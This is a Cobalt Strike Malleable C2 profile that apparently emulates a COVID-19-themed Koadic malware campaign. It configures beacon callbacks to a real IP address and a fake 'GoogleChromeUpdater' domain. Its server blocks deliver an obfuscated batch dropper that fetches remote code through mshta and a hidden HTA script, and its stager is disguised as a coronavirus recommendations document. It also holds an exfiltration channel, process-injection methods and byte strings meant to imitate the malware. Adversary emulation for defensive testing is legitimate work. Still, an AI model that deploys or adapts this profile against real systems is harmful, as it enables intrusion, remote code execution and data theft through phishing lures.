#malware trying to take advantage of the covid19/coronavirus situtation.
#original article = https://isc.sans.edu/forums/diary/COVID19+Themed+Multistage+Malware/25922/
#link to = https://www.virustotal.com/gui/file/c3379e83cd3e8763f80010176905f147fcc126b5e7ad9faa585d5520386bd659/community
#additional info/pcaps = https://app.any.run/tasks/6927bb76-156f-4cb9-aced-0f5adfca01f8/
#koadic tool = https://github.com/zerosum0x0/koadic
#xx0hcd

###Global Options###
set sample_name "covid19_koadic.profile";

set sleeptime "37500";
set jitter    "33";
set useragent "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729";

set host_stage "true";

###DNS options###
set dns_idle "8.8.8.8";
set maxdns    "245";
set dns_sleep "0";
set dns_stager_prepend "";
set dns_stager_subhost "";
set dns_max_txt "252";
set dns_ttl "1";

###SMB options###
set pipename "ntsvcs";
set pipename_stager "scerpc";

###TCP options###
set tcp_port "8000";

###SSL Options###

#I only saw HTTP traffic, if using HTTPS set something to not use defaults.
#https-certificate {
    #set keystore "your_store_file.store";
    #set password "your_store_pass";
#}

#https-certificate {
#    set C "US";
#    set CN "whatever.com";
#    set L "California";
#    set O "whatever LLC.";
#    set OU "local.org";
#    set ST "CA";
#    set validity "365";
#}

#code-signer {
    #set keystore "your_keystore.jks";
    #set password "your_password";
    #set alias "server";
#}

###HTTP-Config Block###
#http-config {
#    set headers "Server, Content-Type";
#    header "Content-Type" "text/html;charset=UTF-8";
#    header "Server" "nginx";
#
#    set trust_x_forwarded_for "false";
#}

###HTTP-GET Block###
 
http-get {

    set uri "/auto.cfg.bat";

    client {

        header "Host" "216.189.145.11";
        header "Connection" "Keep-Alive";

	   
    metadata {

        base64url;
        prepend "SESSIONID=";
        header "Cookie";

    }

    }

    server {
        header "Server" "Apache/2.2.22 (Ubuntu)";
        header "Last-Modified" "Thu, 05 Mar 2020 01:46:51 GMT";
        header "ETag" "41fc-e159-5a011b5f258c0";
        header "Accept-Ranges" "bytes";
        header "Keep-Alive" "timeout=5, max=100";
        header "Connection" "Keep-Alive";
        header "Content-Type" "application/x-msdos-program";
 
        output {

            netbios;
            	       
	    prepend "..&@cls&@set \".n..=";

	    append "\"";
	    append "%.n..:~49,1%%.n..:~51,1%%.n..:~16,1%%.n..:~17,1";
	    append "%.n..:~50,1%\"%.n..:~8,1%.%.n..:~53,1%%.......%";
	    append "%.n..:~23,1%%.n..:~12,1%%.n..:~19,1%%.n..:~4,1%%.n..:~29,1%%.n..:~14,1%";
	    append "%.n..:~45,1%%.n..:~62,1%%.n..:~50,1%%.n..:~48,1%%.n..:~56,1%";
	    append "%.n..:~32,1%%.n..:~41,1%%.n..:~61,1%%.n..:~49,1%%af..O.c%%.n..:~57,1%\"";
	    append "%N.lo.:~63,1%%N.lo.:~48,1%%N.lo.:~57,1%%N.lo.:~0,1%%N.lo.:~51,1%";
	    append "%N.lo.:~1,1%%N.lo.:~10,1%%N.lo.:~37,1%%N.lo.:~42,1%%N.lo.:~58,1";
	    append "%N.lo.:~8,1%%N.lo.:~59,1%%...A...%%N.lo.:~30,1%%N.lo.:~22,1%%\n";
	    append "%..h:~26,1%%..h:~7,1%%..h:~14,1%%..h:~54,1%%..h:~59,1%\"%..h:~14,1";
	    append "%..h:~55,1%%..h:~41,1%..=%..h:~39,1%%..h:~36,1%%..h:~55,1%%..h:~27,1";
	    append "%..h:~29,1%%..h:~7,1%%..h:~8,1%%..h:~56,1%%..h:~22,1%%mUFZ.qO\n";
	    append "%emq..:~25,1%%emq..:~4,1%%emq..:~50,1%%emq..:~37,1%%emq..:~11,1";
	    append "%emq..:~61,1%%emq..:~14,1%%X.bP.A.%%emq..:~45,1%%emq..:~27,1";
	    append "%emq..:~42,1%%emq..:~41,1%%emq..:~2,1%%emq..:~35,1%%emq..:~15,1\n";
	    append "%..O..:~22,1%%..O..:~13,1%%..O..:~40,1%=%..O..:~49,1%%..O..:~37,1%";
	    append "%..O..:~42,1%%..O..:~1,1%%..y.EKZ%%..O..:~58,1%%..O..:~10,1";
	    append "%..O..:~45,1%%..O..:~36,1%%..O..:~40,1%%..O..:~11,1%%..O..:~44,1%";
	    append "%..O..:~63,1%%..O..:~53,1%%..O..:~4,1%%..O..:~41,1%%..O..:~0,1\n";
	    append "%.cgK:~48,1%%.cgK:~43,1%%.cgK:~36,1%%.cgK:~45,1%%.cgK:~18,1%\"...";
	    append "%.cgK:~1,1%=%.cgK:~43,1%%.cgK:~58,1%%.cgK:~57,1%%.cgK:~47,1%";
	    append "%.cgK:~20,1%%.cgK:~63,1%%.cgK:~42,1%%.cgK:~54,1%%.cgK:~3,1%%.cgK:~27,1%";
	    append "%.cgK:~19,1%%.cgK:~18,1%%.cgK:~50,1%%.cgK:~17,1%%.cgK:~53,1%\n";
	    append "%..S.m:~46,1%%..S.m:~46,1%%..S.m:~50,1%/%..S.m:~4,1%%..S.m:~40,1%";
	    append "%..S.m:~50,1%'%..S.m:~45,1%%..S.m:~63,1%%..S.m:~31,1%%..S.m:~27,1%";
	    append "%..S.m:~29,1%%..S.m:~50,1%%..S.m:~31,1%%..S.m:~27,1%%..S.m:~27,1%";
	    append "%..S.m:~58,1%:\\Program%..S.m:~50,1%%..S.m:~46,1%%..S.m:~17,1%%..S.m:~13,1%%..S.m:~44,1%%..S.m:~63,1%%..S.m:~47,1%%..S.m:~17,1%%..S.m:~61,1%%..S.m:~7,1%%..S.m:~28,1%%....Y..%%..S.m:~63,1%%..S.m:~28,1%%..S.m:~25,1%%..S.m:~27,1%%..S.m:~50,1%%..S.m:~54,1%%..S.m:~44,1%%..S.m:~61,1%%..S.m:~26,1%%..S.m:~7,1%%..S.m:~17,1%%..S.m:~27,1%%..S.m:~5,1%%..S.m:~50,1%%..S.m:~58,1%%..S.m:~13,1%%..S.m:~17,1%%..S.m:~44,1%%.IELFnR%%..S.m:~11,1%%..S.m:~27,1%%..S.m:~63,1%%..S.m:~44,1%\n";
	    append "%..S.m:~45,1%%..S.m:~63,1%%..S.m:~31,1%%..S.m:~27,1%%..S.m:~29,1%%..MNvzZ%%..S.m:~50,1%%..S.m:~31,1%%..S.m:~27,1%%..S.m:~27,1%%..S.m:~52,1%://GoogleChromeUpdater.twilightparadox.com:448/html\n";
	    append "{%..S.m:~50,1%%..S.m:~63,1%%..S.m:~61,1%%..S.m:~31,1%%..S.m:~27,1%%BAJM..s%%..S.m:~29,1%%..S.m:~63,1%%..S.m:~1,1%%..S.m:~63,1%%..S.m:~50,1%/%..S.m:~61,1%%..S.m:~7,1%%..S.m:~44,1%%..S.m:~29,1%%..S.m:~27,1%%..S.m:~44,1%%..S.m:~50,1%%Q.G.X..%/%..S.m:~4,1%%..S.m:~35,1%%..S.m:~50,1%%..S.m:~30,1%%..S.m:~26,1%%..S.m:~27,1%%..S.m:~28,1%%..S.m:~45,1%%..S.m:~29,1%%..S.m:~27,1%%..S.m:~17,1%%..S.m:~61,1%%..S.m:~58,1%%..S.m:~31,1%%..S.m:~7,1%%..S.m:~28,1%%..S.m:~29,1%%..S.m:~50,1%%..S.m:~31,1%%..S.m:~27,1%%..S.m:~27,1%%..S.m:~52,1%://GoogleChromeUpdater.twilightparadox.com:448/html'%..S.m:~50,1%/%..S.m:~54,1%%..S.m:~58,1%%..S.m:~50,1%%..S.m:~45,1%%..S.m:~17,1%%..S.m:~11,1%%..S.m:~26,1%%..S.m:~27,1%%..S.m:~44,1%%..S.m:~50,1%%u.D....%/%..S.m:~45,1%%..S.m:~28,1%%..S.m:~50,1%%..jo...%%..S.m:~8,1%%..S.m:~10,1%%V.t.I..%}";

            print;
        }
    }
}

#HTTP-GET VARIANT
http-get "variant_runhtml" {
 
    set uri "/HTML"; 
    
    client {
        
        header "Accept" "*/*";
        header "Host" "googlechromeupdater.twilightparadox.com:448";
        header "Connection" "Keep-Alive";
    
    
    metadata {
        
    base64url;
    parameter "T8CZ8I99GN";
    
    }
    
    parameter "50A5DMT1H2" "4de0613ada094a9da7843ced5f13403c;\\..\\..\\..\\./mshtml,RunHTMLApplication";
    
  }
  
    server {
        
        header "Server" "Apache";
        
        output {
            netbios;
            
            prepend "function HddnzGqisJrusLHIZYYC(HGGiTYMzde,sLZQEvXCZyyFu){var eMSnPEGHOaoxNNBH='";
            prepend "catch (e) {}\n\n";
            prepend "}\n";
            prepend "    window.onfocus = function() { window.blur(); }\n";
            prepend "    window.onerror = function(sMsg, sUrl, sLine) { return false; }\n";
            prepend " {\n";
            prepend "try\n\n";
            prepend "window.resizeTo(2, 4);\n";
            prepend "window.blur();\n";
            prepend "window.moveTo(-1337, -2019);\n";
            prepend "<script language=\"JScript\">\n";
            prepend "<head>\n";
            prepend "<html>\n";

            append "'\n";         
            append "</script>\n";
            append "<hta:application caption=\"no\" windowState=\"minimize\" showInTaskBar=\"no\"\n";
            append "        scroll=\"no\" navigable=\"no\" />\n";
            append "        <!-- -->\n";
            append "</head>\n";
            append "<body>\n";
            append "</body>\n";
            append "</html>";
            
            print;
        }
        
    }
  
}

###HTTP-Post Block###

#exfiltrates data from host.
http-post {
    
    set uri "/html";
    #set verb "GET";
    set verb "POST";

    client {

	header "Accept" "*/*";
	header "Referer" "http://googlechromeupdater.twilightparadox.com:448/html";
	header "encoder" "1252";
	header "shellchcp" "437";
	header "Host" "googlechromeupdater.twilightparadox.com:448";
	     
        
        output {
            base64url;
	    parameter "T8CZ8I99GN";
	    
        }

        id {
	    base64url;
	    parameter "50A5DMT1H2";

        }
    }

    server {
    
        header "Server" "Apache";

        output {
            netbios;
            print;
        }
    }
}

###HTTP-Stager Block###
http-stager {

    set uri_x86 "/RECOMMENDATIONS_CORONAVIRUS.doc";
    set uri_x64 "/Recommendations_Coronavirus.doc";

    client {
    
        header "Host" "216.189.145.11";
        header "Connection" "Keep-Alive";
	
    }

    server {
        
        header "Server" "Apache/2.2.22 (Ubuntu)";
        header "Keep-Alive" "timeout=5, max=100";
        header "Connection" "Keep-Alive";
	
	output {
	    
	    print;
	}

    }
}


###Malleable PE/Stage Block###

#filled this out best I could.
stage {
    set checksum        "0";
    set compile_time    "04 Mar 2020 17:56:00";
    set entry_point     "170000";
    set image_size_x86 "740000";
    set image_size_x64 "740000";
    #set name	        "WWanMM.dll";
    set userwx 	        "false";
    set cleanup	        "false";
    set sleep_mask	"false";
    set stomppe	        "false";
    set obfuscate	"false";
    set rich_header     "";
    
    set sleep_mask "false";

    #set module_x86 "wwanmm.dll";
    #set module_x64 "wwanmm.dll";

    transform-x86 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.dll" "";
        }

    transform-x64 {
        #prepend "\x90\x90\x90";
        strrep "ReflectiveLoader" "";
        strrep "beacon.x64.dll" "";
        }

    #from yara strings = https://malpedia.caad.fkie.fraunhofer.de/details/win.koadic
    string "{ e8???????? 8b54242c e8???????? 8b15???????? 011424 e8???????? }";
    string "{ 50 e8???????? 6800080000 ff742404 e8???????? ff3424 }";
    string "{ a3???????? ff7504 58 a3???????? ff7508 58 a3???????? }";
    string "{ 56 6a20 57 e8???????? 83c40c c6043700 }";
    string "{ 52 e8???????? eb7f 6a08 50 }";
    string "{ e8???????? 7512 ff3424 ba32204100 59 e8???????? 7502 }";
    string "{ 31c0 50 6834204100 ff35???????? }";

}

###Process Inject Block###
process-inject {

    #set allocator "NtMapViewOfSection";		

    set min_alloc "16700";

    set userwx "false";  
    
    set startrwx "false";
        
    transform-x86 {
        #prepend "\x90\x90\x90";
    }
    transform-x64 {
        #prepend "\x90\x90\x90";
    }

    execute {
        CreateThread;
        CreateRemoteThread;       

        CreateThread "ntdll.dll!RtlUserThreadStart+0x1000";

        SetThreadContext;

        NtQueueApcThread-s;

        #NtQueueApcThread;

        CreateRemoteThread "kernel32.dll!LoadLibraryA+0x1000";

        RtlCreateUserThread;
    }
}

###Post-Ex Block###
post-ex {

    set spawnto_x86 "%windir%\\syswow64\\rundll32.exe";
    set spawnto_x64 "%windir%\\sysnative\\rundll32.exe";

    set obfuscate "false";

    set smartinject "false";

    set amsi_disable "false";

}
